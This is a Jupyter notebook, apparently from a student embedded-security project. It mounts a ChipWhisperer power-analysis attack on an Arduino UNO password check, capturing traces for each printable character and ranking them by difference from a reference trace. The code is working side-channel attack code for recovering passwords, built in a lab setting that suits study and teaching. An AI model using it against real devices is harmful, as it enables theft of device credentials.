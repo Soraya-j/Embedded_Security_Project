{
 "cells": [
  {
   "cell_type": "markdown",
   "id": "18c568f6-90f4-40d4-9c99-ddb3a53787dc",
   "metadata": {},
   "source": [
    "# Code for the power analysis attack against an Arduino UNO (target extern)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 4,
   "id": "a879d210-c804-479a-80e1-c0b3376d7618",
   "metadata": {},
   "outputs": [],
   "source": [
    "import chipwhisperer as cw\n",
    "import time\n",
    "import matplotlib.pyplot as plt\n",
    "import numpy as np"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "77926474-f2bb-4d9f-b1b4-6e7b8d1e6633",
   "metadata": {},
   "source": [
    "### Setup scope and target"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 5,
   "id": "496f0d59-32c3-4241-a438-d72b11f8795b",
   "metadata": {},
   "outputs": [],
   "source": [
    "scope = cw.scope()\n",
    "scope.default_setup()\n",
    "target = cw.target(scope, cw.targets.SimpleSerial2)\n",
    "target.baud = 9600   # match your Arduino sketch\n",
    "\n",
    "scope.adc.samples = 5000"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "e60e9d9d-a733-4f37-ba51-b5216d45b246",
   "metadata": {},
   "source": [
    "### Reset of the target"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "2ec4b6b1-39db-4121-9d47-80dfdaff51fc",
   "metadata": {},
   "outputs": [],
   "source": [
    "#time.sleep(5)\n",
    "#print('start')\n",
    "\n",
    "# reset de la target\n",
    "scope.io.nrst = 'low'\n",
    "time.sleep(0.1)\n",
    "scope.io.nrst = 'high'\n",
    "\n",
    "# attendre que la cible redémarre\n",
    "time.sleep(0.1)\n",
    "#print('finish')"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "e8f330d2-de77-4d02-91c9-81e2f1340297",
   "metadata": {},
   "source": [
    "### Send of a password prompt"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 7,
   "id": "9ccac8da-fc27-43d7-bfd5-3c020bbfd9a3",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Boot message: \n",
      "Response: >> ACCESS DENIED\n",
      "\n",
      "Enter password:\n",
      "\n"
     ]
    }
   ],
   "source": [
    "password_try = b\"\\x01\\n\"\n",
    "# Use the raw serial object, not SimpleSerial parsing\n",
    "print(\"Boot message:\", target.ser.read(50))   # read up to 50 bytes\n",
    " \n",
    "# Send a password\n",
    "target.ser.write(password_try)\n",
    "print(\"Response:\", target.ser.read(50))"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "443ce10a-25ab-4bad-9e45-2aecc26d1958",
   "metadata": {},
   "source": [
    "### Function to send charachters and capture a trace"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "ace73a18-c98f-47b6-8eba-250517194c46",
   "metadata": {},
   "outputs": [],
   "source": [
    "def pass_trace(pass_guess):\n",
    "\n",
    "    scope.arm()\n",
    "    target.ser.write(pass_guess)\n",
    "    ret = scope.capture()\n",
    "    if ret:\n",
    "        print('Timeout happened during acquisition')\n",
    "\n",
    "    trace = scope.get_last_trace()\n",
    "    return trace"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "f50a4dba-debe-4467-b967-b49f1537c8ef",
   "metadata": {},
   "source": [
    "### List of charachters who can be in the password"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 1,
   "id": "eb1f9b22-72d8-4db2-8f99-f230947aa2f0",
   "metadata": {},
   "outputs": [],
   "source": [
    "ascii_chars = [chr(i) for i in range(33, 127)]\n",
    "\n",
    "#'charchter who are not in the password (can be used for the ref trace)'\n",
    "#non_asci = [chr(k) for k in range(1, 33)]\n",
    "#test_chara = 'abcdef7'#ghij'\n",
    "\n",
    "#print(non_asci)\n",
    "#print(ascii_chars)"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "f5436873-3e19-4bac-b50a-b4bdfda75bc8",
   "metadata": {},
   "source": [
    "### Plot of traces for every possible character"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "1506d39e-92f0-449e-a4f0-e3639911293b",
   "metadata": {},
   "outputs": [],
   "source": [
    "plot = cw.plot({})\n",
    "for c in ascii_chars: \n",
    "    trace = pass_trace(c + \"\\n\")[0:500]\n",
    "    plot *= cw.plot(trace) # - ref_trace)\n",
    "plot\n"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "091bb8ba-a3b0-43ea-b152-74b51320606d",
   "metadata": {},
   "source": [
    "### Plot of traces - a ref trace"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "bfa8412a-5524-41de-bf39-1737e6b79cac",
   "metadata": {},
   "outputs": [],
   "source": [
    "ref_trace = pass_trace(\"\\x01\\n\")[0:500]\n",
    "plot = cw.plot({})\n",
    "for c in ascii_chars: \n",
    "    trace = pass_trace(c + \"\\n\")[0:500]\n",
    "    plot *= cw.plot(trace - ref_trace)\n",
    "plot"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "91afbecc-d268-4b02-94f4-e1085da344bc",
   "metadata": {},
   "source": [
    "### Calcul of the character that differ the most"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "20152a68-6340-4f05-9129-65260207e016",
   "metadata": {},
   "outputs": [],
   "source": [
    "#x = 100\n",
    "#i = 1\n",
    "\n",
    "ref_trace = pass_trace(\"a\\n\")[125:130]#[100 + x*i : 200 + x*i]\n",
    "prec_diff = 0\n",
    "\n",
    "for c in ascii_chars: \n",
    "    target.ser.read(50)\n",
    "    trace = pass_trace(c + \"\\n\")[125:130] #[100 + x*i : 200 + x*i]\n",
    "    diff = np.sum(np.abs(trace - ref_trace))\n",
    "    \n",
    "    \n",
    "    if diff > prec_diff :\n",
    "        print(\"{:1} diff = {:2}\".format(c, diff))\n",
    "        prec_diff = diff\n",
    "\n",
    "    time.sleep(0.1)    #3 est une valeur qui fonctionne bien mais c'est lent\n",
    "    #i = i + 1"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 8,
   "id": "dcf4a813-3326-4471-8319-c16059c0bf20",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "True"
      ]
     },
     "execution_count": 8,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "scope.dis()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "f35c44dc-2e0f-4193-8a87-946690f59476",
   "metadata": {},
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3 (ipykernel)",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.12.9"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}
